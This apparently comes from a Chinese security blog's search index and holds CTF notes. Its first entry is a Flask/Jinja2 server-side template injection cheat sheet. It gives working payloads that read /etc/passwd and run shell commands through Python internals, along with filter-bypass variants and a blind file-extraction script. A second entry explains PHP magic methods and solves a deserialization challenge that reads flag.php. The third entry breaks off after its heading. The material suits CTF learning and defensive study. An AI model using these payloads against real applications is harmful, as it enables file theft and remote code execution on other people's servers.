<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>FlaskSSTI</title>
    <url>/2020/03/15/CTF/FlaskSSTI%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="FlaskSSTI"><a href="#FlaskSSTI" class="headerlink" title="FlaskSSTI"></a>FlaskSSTI</h1><h2 id="0x00魔术方法"><a href="#0x00魔术方法" class="headerlink" title="0x00魔术方法"></a>0x00魔术方法</h2><a id="more"></a>

<ul>
<li><strong>dict</strong>：保存类实例或对象实例的属性变量键值对字典</li>
<li><strong>class</strong>：返回调用的参数类型</li>
<li><strong>mro</strong>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li>
<li><strong>bases</strong>：返回类型列表</li>
<li><strong>subclasses</strong>：返回object的子类</li>
<li><strong>init</strong>：类的初始化方法</li>
<li><strong>globals</strong>：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</li>
</ul>
<p><code>__base__</code> 和 <code>__mro__</code> 都是用来寻找基类的。</p>
<h2 id="0x01基本流程"><a href="#0x01基本流程" class="headerlink" title="0x01基本流程"></a>0x01基本流程</h2><p>可以利用<code>2</code>简单代码测试是否存在SSTI</p>
<p>使用魔术方法进行函数解析，再获取基本类object：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用</span><br></pre></td></tr></table></figure>
<p>获取到基本类之后,可以继续使用subclasses获取object的子类:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.__subclasses__()</span><br><span class="line"></span><br><span class="line">#改变数字可以爆破</span><br><span class="line">object.__subclasses__[10]</span><br></pre></td></tr></table></figure>
<p>找到重载过的<code>__init__</code>类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[99].__init__</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__</span><br></pre></td></tr></table></figure>
<p>查看其引用 <code>__builtins__</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</span><br></pre></td></tr></table></figure>
<p>读写文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#读</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#写</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).write()</span><br><span class="line"></span><br><span class="line">#若存在子模块,可以直接调用读写文件</span><br><span class="line">[].__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">[].__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).write()</span><br></pre></td></tr></table></figure>
<h2 id="0x02命令执行"><a href="#0x02命令执行" class="headerlink" title="0x02命令执行"></a>0x02命令执行</h2><h3 id="利用eval-进行命令执行"><a href="#利用eval-进行命令执行" class="headerlink" title="利用eval 进行命令执行"></a>利用eval 进行命令执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</span><br></pre></td></tr></table></figure>
<h3 id="利用warnings-catch-warnings-进行命令执行"><a href="#利用warnings-catch-warnings-进行命令执行" class="headerlink" title="利用warnings.catch_warnings 进行命令执行"></a>利用warnings.catch_warnings 进行命令执行</h3><p>查看<code>warnings.catch_warnings</code>方法的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59</span><br></pre></td></tr></table></figure>
<p>查看<code>linecatch</code>的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#39;linecache&#39;)25</span><br></pre></td></tr></table></figure>
<p>查找<code>os</code>模块的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)12</span><br></pre></td></tr></table></figure>
<p>查找<code>system</code>方法的位置(在这里使用<code>os.open().read()</code>可以实现一样的效果,步骤一样,不再复述)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.keys().index(&#39;system&#39;)144</span><br></pre></td></tr></table></figure>
<p>调用<code>system</code>方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)root0</span><br></pre></td></tr></table></figure>
<h3 id="利用commands-进行命令执行"><a href="#利用commands-进行命令执行" class="headerlink" title="利用commands 进行命令执行"></a>利用commands 进行命令执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br></pre></td></tr></table></figure>
<h2 id="0x04常见绕过方式"><a href="#0x04常见绕过方式" class="headerlink" title="0x04常见绕过方式"></a>0x04常见绕过方式</h2><h4 id="绕过中括号"><a href="#绕过中括号" class="headerlink" title="绕过中括号"></a>绕过中括号</h4><p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>
<p>在这里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过</p>
<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><p><code>request.args</code> 是flask中的一个属性,为返回请求的参数,这里把<code>path</code>当作变量名,将后面的路径传值进来,进而绕过了引号的过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>先获取chr函数，赋值给chr，后面拼接字符串就好了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h4><p>同样利用<code>request.args</code>属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure>
<p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#GET:</span><br><span class="line">&#123;&#123; &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;</span><br><span class="line">#POST:</span><br><span class="line">class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure>
<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p><strong>base64编码绕过</strong><br><code>__getattribute__</code>使用实例访问属性时,调用该方法</p>
<p>例如被过滤掉<code>__class__</code>关键词</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>字符串拼接绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="同时绕过下划线、与中括号"><a href="#同时绕过下划线、与中括号" class="headerlink" title="同时绕过下划线、与中括号"></a>同时绕过下划线、与中括号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)|attr(request.values.name5)()&#125;&#125;post:name1&#x3D;__class__&amp;name2&#x3D;__base__&amp;name3&#x3D;__subclasses__&amp;name4&#x3D;pop&amp;name5&#x3D;read</span><br></pre></td></tr></table></figure>
<h4 id="绕过-过滤"><a href="#绕过-过滤" class="headerlink" title="绕过.过滤"></a>绕过<code>.</code>过滤</h4><p>若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code><br>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></p>
<h4 id="读取config中flag-绕过"><a href="#读取config中flag-绕过" class="headerlink" title="读取config中flag,绕过"></a>读取config中flag,绕过</h4><h5 id="直接使用config"><a href="#直接使用config" class="headerlink" title="直接使用config"></a>直接使用config</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="利用self"><a href="#利用self" class="headerlink" title="利用self"></a>利用self</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="还可以利用flask的内置函数和类"><a href="#还可以利用flask的内置函数和类" class="headerlink" title="还可以利用flask的内置函数和类"></a>还可以利用flask的内置函数和类</h5><p><code>url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config</code>等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="过滤大括号"><a href="#过滤大括号" class="headerlink" title="过滤大括号"></a>过滤大括号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以利用&#123;%%&#125;替代&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="盲注文件内容"><a href="#盲注文件内容" class="headerlink" title="盲注文件内容"></a>盲注文件内容</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;flag&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39;%&#125;~p0~&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">#脚本</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">    postdata &#x3D; &#123;</span><br><span class="line">        &#39;exploit&#39;:payload</span><br><span class="line">        &#125;</span><br><span class="line">    r &#x3D; requests.post(url, data&#x3D;postdata).content</span><br><span class="line">    return &#39;~p0~&#39; in r</span><br><span class="line"></span><br><span class="line">password  &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; r&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\\]^&#96;&#123;|&#125;~\&#39;&quot;_%&#39;</span><br><span class="line"></span><br><span class="line">for i in xrange(0,100):</span><br><span class="line">    for c in s:</span><br><span class="line">        payload &#x3D; &#39;&#123;% if &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;&#x2F;flag&quot;).read()[&#39;+str(i)+&#39;:&#39;+str(i+1)+&#39;] &#x3D;&#x3D; &quot;&#39;+c+&#39;&quot; %&#125;~p0~&#123;% endif %&#125;&#39;</span><br><span class="line">        if check(payload):</span><br><span class="line">            password +&#x3D; c</span><br><span class="line">            break</span><br><span class="line">    print password</span><br></pre></td></tr></table></figure>
<h2 id="0x05常用payload"><a href="#0x05常用payload" class="headerlink" title="0x05常用payload"></a>0x05常用payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>FlaskSSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化</title>
    <url>/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP魔术方法</a></p>
<a id="more"></a>

<p>1、<code>__sleep()</code></p>
<ul>
<li><code>serialize()</code>函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。</li>
<li>如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</li>
<li>如果该方法未返回任何内容，则 <strong>NULL</strong> 被序列化，并产生一个 <strong>E_NOTICE</strong> 级别的错误。</li>
</ul>
<p>2、<code>__wake()</code></p>
<ul>
<li><code>unserialize()</code>会检查是否存在一个 <code>__wakeup()</code>方法。如果存在，则会先调用 <em>__wakeup</em> 方法，预先准备对象需要的资源。</li>
<li><code>__wakeup()</code>经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</li>
</ul>
<p>3、<code>__construct()</code></p>
<ul>
<li>PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</li>
<li>如果子类中定义了构造函数则不会隐式调用其父类的构造函数。要执行父类的构造函数，需要在子类的构造函数中调用 **parent::__construct()**。如果子类没有定义构造函数则会如同一个普通的类方法一样从父类继承（假如没有被定义为 private 的话）。</li>
</ul>
<p>4、<code>__destruct ()</code></p>
<ul>
<li>PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li>
</ul>
<p>5、<code>__toString()</code></p>
<ul>
<li><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a> 方法用于一个类被当成字符串时应怎样回应。例如 <em>echo $obj;</em> 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 <strong>E_RECOVERABLE_ERROR</strong> 级别的致命错误。</li>
<li>需要指出的是在 PHP 5.2.0 之前，<code>__toString()</code>方法只有在直接使用于 <code>echo</code> 或 <code>print</code> 时才能生效。</li>
<li>PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 <code>printf()</code>，使用 <em>%s</em> 修饰符），但不能用于非字符串环境（如使用 <em>%d</em> 修饰符）。</li>
<li>自 PHP 5.2.0 起，如果将一个未定义 <code>__toString()</code> 方法的对象转换为字符串，会产生 <strong>E_RECOVERABLE_ERROR</strong> 级别的错误。</li>
</ul>
<p>6、<code>__invoke()</code></p>
<ul>
<li><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code>方法会被自动调用。</p>
</li>
<li><p>示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CallableClass </span><br><span class="line">&#123;</span><br><span class="line">    function __invoke($x) &#123;</span><br><span class="line">        var_dump($x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new CallableClass;</span><br><span class="line">$obj(5);</span><br><span class="line">var_dump(is_callable($obj));</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;样例输出    </span><br><span class="line">int(5)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
<p>7、<code>__call()</code>和<code>__callStatic()</code></p>
</li>
<li><p>方法重载</p>
</li>
<li><p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用</p>
</li>
<li><p>在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被<code>调用</code></p>
</li>
<li><p><code>$name</code>参数是要调用的方法名称。<code>$arguments</code>参数是一个枚举数组，包含着要传递给方法 <code>$name</code> 的参数。</p>
</li>
</ul>
<p>8、<code>__set()</code> <code>__get()</code> <code>__isset()</code> <code>__unset</code></p>
<ul>
<li>在给不可访问属性赋值时，<code>__set()</code> 会被调用。</li>
<li>读取不可访问属性的值时，<code>__get()</code> 会被调用。</li>
<li>当对不可访问属性调用 <code>isset()</code> 或 <code>empty()</code> 时，<code>__isset()</code> 会被调用。</li>
<li>当对不可访问属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用。</li>
<li>参数 <code>$name</code> 是指要操作的变量名称。<code>__set()</code> 方法的 <code>$value</code> 参数指定了 <code>$name</code>变量的值。</li>
<li>属性重载只能在对象中进行。在静态方法中，这些魔术方法将不会被调用。所以这些方法都不能被声明为 <code>static</code>。从 PHP 5.3.0 起, 将这些魔术方法定义为 <em>static</em> 会产生一个<strong>警告</strong>。</li>
</ul>
<p>9、<code>__set_state()</code></p>
<ul>
<li><p>自 PHP 5.1.0 起当调用 <code>var_export()</code>导出类时，此<strong>静态</strong>方法会被调用。</p>
</li>
<li><p>本方法的唯一参数是一个数组，其中包含按 <em>array(‘property’ =&gt; value, …)</em> 格式排列的类属性。</p>
</li>
<li><p>示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $var1;</span><br><span class="line">    public $var2;</span><br><span class="line">    public static function __set_state($an_array)&#123; &#x2F;&#x2F; As of PHP 5.1.0</span><br><span class="line">        $obj &#x3D; new A;</span><br><span class="line">        $obj-&gt;var1 &#x3D; $an_array[&#39;var1&#39;];</span><br><span class="line">        $obj-&gt;var2 &#x3D; $an_array[&#39;var2&#39;];</span><br><span class="line">        return $obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A;</span><br><span class="line">$a-&gt;var1 &#x3D; 5;</span><br><span class="line">$a-&gt;var2 &#x3D; &#39;foo&#39;;</span><br><span class="line"></span><br><span class="line">eval(&#39;$b &#x3D; &#39; . var_export($a, true) . &#39;;&#39;); </span><br><span class="line">&#x2F;&#x2F; $b &#x3D; A::__set_state(array(</span><br><span class="line">&#x2F;&#x2F;    &#39;var1&#39; &#x3D;&gt; 5,</span><br><span class="line">&#x2F;&#x2F;    &#39;var2&#39; &#x3D;&gt; &#39;foo&#39;,</span><br><span class="line">&#x2F;&#x2F; ));</span><br><span class="line">var_dump($b);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;以上样例会输出：</span><br><span class="line">object(A)#2 (2) &#123;</span><br><span class="line">  [&quot;var1&quot;]&#x3D;&gt;</span><br><span class="line">  int(5)</span><br><span class="line">  [&quot;var2&quot;]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;foo&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>10、<code>__clone()</code></p>
</li>
<li><p>当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。</p>
</li>
<li><p>当复制完成时，如果定义了 <code>__clone()</code> 方法，则新创建的对象（复制生成的对象）中的<code>__clone()</code>方法会被调用，可用于修改属性的值（如果有必要的话）</p>
</li>
<li><p>示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SubObject&#123;</span><br><span class="line">    static $instances &#x3D; 0;</span><br><span class="line">    public $instance;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;instance &#x3D; ++self::$instances;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone() &#123;</span><br><span class="line">        $this-&gt;instance &#x3D; ++self::$instances;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyCloneable&#123;</span><br><span class="line">    public $object1;</span><br><span class="line">    public $object2;</span><br><span class="line"></span><br><span class="line">    function __clone()&#123;      </span><br><span class="line">        &#x2F;&#x2F; 强制复制一份this-&gt;object， 否则仍然指向同一个对象</span><br><span class="line">        $this-&gt;object1 &#x3D; clone $this-&gt;object1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj &#x3D; new MyCloneable();</span><br><span class="line"></span><br><span class="line">$obj-&gt;object1 &#x3D; new SubObject();</span><br><span class="line">$obj-&gt;object2 &#x3D; new SubObject();</span><br><span class="line"></span><br><span class="line">$obj2 &#x3D; clone $obj;</span><br><span class="line"></span><br><span class="line">print(&quot;Original Object:\n&quot;);</span><br><span class="line">print_r($obj);</span><br><span class="line"></span><br><span class="line">print(&quot;Cloned Object:\n&quot;);</span><br><span class="line">print_r($obj2);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;以上样例会输出</span><br><span class="line">Original Object:</span><br><span class="line">MyCloneable Object</span><br><span class="line">(</span><br><span class="line">    [object1] &#x3D;&gt; SubObject Object</span><br><span class="line">        (</span><br><span class="line">            [instance] &#x3D;&gt; 1</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [object2] &#x3D;&gt; SubObject Object</span><br><span class="line">        (</span><br><span class="line">            [instance] &#x3D;&gt; 2</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">Cloned Object:</span><br><span class="line">MyCloneable Object</span><br><span class="line">(</span><br><span class="line">    [object1] &#x3D;&gt; SubObject Object</span><br><span class="line">        (</span><br><span class="line">            [instance] &#x3D;&gt; 3</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [object2] &#x3D;&gt; SubObject Object</span><br><span class="line">        (</span><br><span class="line">            [instance] &#x3D;&gt; 2</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">&#x2F;&#x2F;原始类经过克隆后</span><br><span class="line">&#x2F;&#x2F;object1对象instance属性的值自增了1次,触发了__clone()方法,达到了修改属性值的目的</span><br><span class="line">&#x2F;&#x2F;object2对象instance属性的值只是简单复制.仍然指向原来对象</span><br></pre></td></tr></table></figure>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2></li>
<li><p>构造函数 <code>__construct</code> 对象被创建的时候调用</p>
</li>
<li><p>析构函数 <code>__destruct</code> 对象被销毁的时候调用</p>
</li>
<li><p>方法重载 <code>__call</code> 在对象中调用一个不可访问方法时调用</p>
</li>
<li><p>方法重载 <code>__callStatic</code> 在静态上下文中调用一个不可访问方法时调用</p>
</li>
<li><p>在给不可访问属性赋值时，<code>__set()</code> 会被调用。</p>
</li>
<li><p>读取不可访问属性的值时，<code>__get()</code> 会被调用。</p>
</li>
<li><p>当对不可访问属性调用 <code>isset()</code> 或 <code>empty()</code> 时，<code>__isset()</code> 会被调用</p>
</li>
<li><p>当对不可访问属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用</p>
</li>
<li><p><code>__sleep()</code> 在<code>serialize()</code> 函数执行之前调用</p>
</li>
<li><p><code>__wakeup()</code> 在<code>unserialize()</code> 函数执行之前调用</p>
</li>
<li><p><code>__toString</code> 在一个类被当成字符串时被调用（不仅仅是echo的时候,比如file_exists()判断也会触发</p>
</li>
</ul>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">&lt;?php </span><br><span class="line">    require_once(&#39;shield.php&#39;);</span><br><span class="line">    $x &#x3D; new Shield();</span><br><span class="line">    isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;];</span><br><span class="line">    if (!empty($g)) &#123;</span><br><span class="line">        $x &#x3D; unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $x-&gt;readfile();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;shield.php</span><br><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F;flag is in flag.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public $file;</span><br><span class="line">        function __construct($filename &#x3D; &#39;&#39;) &#123;</span><br><span class="line">            $this -&gt; file &#x3D; $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        function readfile() &#123;</span><br><span class="line">            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)&#x3D;&#x3D;&#x3D;FALSE  </span><br><span class="line">            &amp;&amp; stripos($this-&gt;file,&#39;&#x2F;&#39;)&#x3D;&#x3D;&#x3D;FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)&#x3D;&#x3D;FALSE) &#123;</span><br><span class="line">                return @file_get_contents($this-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>传入一个参数<code>class</code>,class赋值给$g,然后对g进行反序列化</p>
<p>利用的对象是Shield,两个方法,<code>__construct</code>在对象被创建时调用,这里并没有创建对象,这里不需要创建对象,所以反序列化不会触发该方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Shield &#123;</span><br><span class="line">        public $file&#x3D;&quot;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new Shield();</span><br><span class="line">echo serialize($a);</span><br><span class="line">&#x2F;&#x2F;将输出值传过去即可读取flag文件得到flag</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化绕过姿势</title>
    <url>/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="PHP反序列化绕过姿势"><a href="#PHP反序列化绕过姿势" class="headerlink" title="PHP反序列化绕过姿势"></a>PHP反序列化绕过姿势</h1><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><a id="more"></a>

